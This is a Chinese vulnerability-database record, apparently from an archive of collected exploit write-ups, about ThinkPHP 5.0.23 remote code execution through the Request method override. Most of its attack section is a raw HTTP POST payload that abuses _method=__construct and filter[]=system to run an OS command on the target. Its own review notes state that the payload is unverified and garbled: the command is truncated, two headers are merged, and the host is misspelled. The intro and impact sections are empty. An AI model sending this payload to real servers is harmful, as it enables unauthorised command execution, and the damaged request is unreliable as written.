---
source: "hatch 补库批 20260928"
product: "ThinkPHP / Request覆盖"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.23"
prerequisites: "来源所述条件，未列明部分仍待核：仅标题 5.0.23；无完整影响/修复范围，未独立证实该版本可利用"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-f130f8f5d3692059b97a0aa3"
entity_id: "ve-f130f8f5d3692059b97a0aa3"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅标题 5.0.23；无完整影响/修复范围，未独立证实该版本可利用

代码与实验材料：已全文读取全部载荷；仅静态分析，没有实验响应；部分包含写文件/下载副作用

来源证据范围：只有hatch补库标签，无原作者或原始漏洞资料

- **代码与转录边界（1）**：前提、证据和归属不足；依据：完整包但whoami截为whoam，Accept与Accept-Language同行；固定Length72，Host拼写yuorip。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（2）**：以单版本拆文件造成重复和误导；依据：简介及影响范围为空，标题版本不能代替实际组件/配置验证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.23

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    POST /index.php?s=captcha HTTP/1.1
    Host: yuorip
    Accept-Encoding: gzip, deflate
    Accept: */* Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 72


    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoam
